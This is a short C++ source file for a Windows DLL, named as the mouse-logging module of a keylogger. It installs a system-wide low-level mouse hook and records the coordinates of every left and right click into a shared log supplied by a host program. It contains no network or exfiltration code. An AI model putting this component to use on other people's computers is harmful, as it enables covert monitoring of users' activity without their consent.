//cl /EHsc /LD .\keylog_m_lib.cpp /link User32.lib
#include <Windows.h>
#include <mutex>
#include <string>
#include <vector>
#include <sstream>
#define DLL_EXPORT __declspec(dllexport)
///////////////////////////////////////////////////////////////////////
HHOOK mouseHook;
std::vector<std::string>* sharedLogVector = nullptr;
std::mutex logMutex;
///////////////////////////////////////////////////////////////////////
LRESULT CALLBACK MouseProc(int nCode, WPARAM wParam, LPARAM lParam);
///////////////////////////////////////////////////////////////////////

DLL_EXPORT void Initialize(std::vector<std::string>* logVector)
{
    sharedLogVector = logVector;
    mouseHook = SetWindowsHookEx(WH_MOUSE_LL, MouseProc, GetModuleHandle(NULL), 0);
}

DLL_EXPORT void Cleanup()
{
    if (mouseHook) UnhookWindowsHookEx(mouseHook);
}

LRESULT CALLBACK MouseProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode >= 0)
    {
        MSLLHOOKSTRUCT* mouseStruct = (MSLLHOOKSTRUCT*)lParam;
        int x = mouseStruct->pt.x;
        int y = mouseStruct->pt.y;

        switch (wParam)
        {
            case WM_LBUTTONDOWN:
            {
                std::ostringstream oss;
                oss << x << " , " << y;
                std::string entry = "\n[Left click( " + oss.str() + " )]\n";
                {
                    std::lock_guard<std::mutex> lock(logMutex);
                    sharedLogVector->emplace_back(entry);
                }
                break;
            }
            case WM_RBUTTONDOWN:
            {
                std::ostringstream oss;
                oss << x << " , " << y;
                std::string entry = "\n[Right click( " + oss.str() + " )]\n";
                {
                    std::lock_guard<std::mutex> lock(logMutex);
                    sharedLogVector->emplace_back(entry);
                }
                break;
            }
        }
    }
    return CallNextHookEx(mouseHook, nCode, wParam, lParam);
}